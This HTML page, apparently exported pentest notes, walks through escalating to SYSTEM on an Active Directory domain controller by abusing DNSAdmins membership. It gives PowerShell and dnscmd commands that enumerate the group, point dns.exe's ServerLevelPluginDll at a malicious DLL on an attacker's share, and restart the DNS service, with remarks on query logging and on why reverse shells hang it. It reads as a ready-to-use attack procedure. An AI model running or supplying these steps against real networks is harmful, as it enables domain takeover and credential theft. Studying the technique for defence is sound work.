<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>DNSAdmins</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># DNSAdmins</h1></strong><br /><code>dns.exe</code> runs as SYSTEM.<br />Members of the DNSAdmins group can load arbitrary DLLs with the privileges of <code>dns.exe</code> (i.e. SYSTEM)<br /><br />However, to have our malicious DLLs run, we need the privileges to restart <code>dns.exe</code>.<br />   ◇ By default, DNSAdmins don&#39;t have the privs to restart <code>dns.exe</code><br />   ◇ but you might get lucky<br /><br />If DNS is running on the Domain Controller, we could priv-esc to SYSTEM on the Domain Controller.<br /><br /><strong><h2>## Exploit Process</h2></strong><br />1. Enumerate members of DNSAdmins group<br />2. Compromise a member of the DNSAdmins group<br />3. As member of DNSAdmins group, configure DLL using dnscmd.exe from RSAT DNS<br />4. Restart the dns.exe service (not enabled by default, but might get lucky)<br /><br /><div class="codebox"><div class="codebox">#&nbsp;1.&nbsp;Enumerate&nbsp;members&nbsp;of&nbsp;DNSAdmins&nbsp;group<br />#&nbsp;--------------------------------------------------<br />#&nbsp;PowerView<br />Get-NetGroupMember&nbsp;-GroupName&nbsp;&quot;DNSAdmins&quot;<br /><br />#&nbsp;ActiveDirectory&nbsp;module<br />Get-ADGroupMember&nbsp;-Identity&nbsp;DNSAdmins<br /><br />#&nbsp;2.&nbsp;Compromise&nbsp;a&nbsp;member&nbsp;of&nbsp;the&nbsp;DNSAdmins&nbsp;group<br />#&nbsp;--------------------------------------------------<br /><br />#&nbsp;---&nbsp;NEED&nbsp;RSAT&nbsp;(remote&nbsp;administration)&nbsp;DNS&nbsp;TOOLS&nbsp;FOR&nbsp;THIS&nbsp;STAGE&nbsp;---<br /><br />#&nbsp;3.&nbsp;As&nbsp;member&nbsp;of&nbsp;DNSAdmins&nbsp;group,&nbsp;configure&nbsp;DLL&nbsp;using&nbsp;dnscmd.exe&nbsp;from&nbsp;RSAT&nbsp;DNS<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;drop&nbsp;mimilib.dll&nbsp;into&nbsp;a&nbsp;share&nbsp;where&nbsp;domain&nbsp;controller&nbsp;can&nbsp;access&nbsp;it<br />#&nbsp;--------------------------------------------------<br />#&nbsp;with&nbsp;dnscmd&nbsp;-&nbsp;requires&nbsp;RSAT&nbsp;DNS<br />dnscmd&nbsp;&lt;dc&nbsp;hostname&gt;&nbsp;/config&nbsp;/serverlevelplugindll&nbsp;\\&lt;attacker/share&nbsp;ip&gt;\mimilib.dll<br /><br />#&nbsp;with&nbsp;DNS&nbsp;module&nbsp;-&nbsp;requires&nbsp;RSAT&nbsp;DNS<br />$dnssettings&nbsp;=&nbsp;Get-DnsServerSetting&nbsp;-ComputerName&nbsp;&lt;dc&nbsp;hostname&gt;&nbsp;-Verbose&nbsp;-All<br />$dnssettings.ServerLevelPluginDll&nbsp;=&nbsp;&quot;\\&lt;attacker/share&nbsp;ip&gt;\mimilib.dll&quot;<br />Set-DnsServerSetting&nbsp;-InputObject&nbsp;$dnssettings&nbsp;-ComputerName&nbsp;&lt;dc&nbsp;hostname&gt;&nbsp;-Verbose<br /><br />#&nbsp;---&nbsp;MALICIOUS&nbsp;DLL&nbsp;WILL&nbsp;NOW&nbsp;BE&nbsp;SEEN&nbsp;IN&nbsp;REGISTRY&nbsp;ON&nbsp;DOMAIN&nbsp;CONTROLLER&nbsp;(see&nbsp;image&nbsp;below)&nbsp;---<br /><br />#&nbsp;4.&nbsp;Restart&nbsp;the&nbsp;dns.exe&nbsp;service&nbsp;(not&nbsp;enabled&nbsp;by&nbsp;default,&nbsp;but&nbsp;might&nbsp;get&nbsp;lucky)<br />#&nbsp;--------------------------------------------------<br />sc&nbsp;\\&lt;dc&nbsp;hostname&gt;&nbsp;stop&nbsp;dns<br />sc&nbsp;\\&lt;dc&nbsp;hostname&gt;&nbsp;start&nbsp;dns<br /><br />#&nbsp;---&nbsp;With&nbsp;mimilib.dll&nbsp;-&nbsp;can&nbsp;now&nbsp;read&nbsp;all&nbsp;DNS&nbsp;queries&nbsp;at&nbsp;C:\Windows\System32\kiwidns.log&nbsp;---<br />#&nbsp;---&nbsp;OBVIOUSLY&nbsp;CAN&nbsp;WRITE&nbsp;YOUR&nbsp;OWN&nbsp;DLL&nbsp;THAT&nbsp;DOES&nbsp;WHATEVER,&nbsp;don&#39;t&nbsp;write&nbsp;reverse&nbsp;shells&nbsp;because&nbsp;DNS&nbsp;queries&nbsp;to&nbsp;the&nbsp;server&nbsp;will&nbsp;fail&nbsp;&nbsp;---<br /></div></div><br /><br /><a href=""><img src="images/457-1.png" alt="images/457-1.png" /></a><br /><br />You can obviously drop your own DLL (reverse shells are not good though, because dns.exe hangs and tries to run your reverse shell and all subsequent DNS requests to that server will fail)<br /><a href=""><img src="images/457-2.png" alt="images/457-2.png" /></a></div>
</body>
</html>
